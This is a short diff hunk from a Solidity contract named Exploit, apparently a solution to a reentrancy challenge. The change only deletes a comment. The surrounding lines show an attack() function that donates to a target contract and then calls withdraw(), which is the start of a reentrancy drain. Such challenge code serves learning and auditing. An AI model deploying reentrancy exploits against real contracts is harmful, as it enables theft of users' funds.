@@ -21,7 +21,7 @@ contract Exploit {
     }
 
     function attack() public {
-        reentrance.donate{value: 0.001 ether}(address(this)); // Donate to Exploit first
+        reentrance.donate{value: 0.001 ether}(address(this));
         withdraw();
     }
 
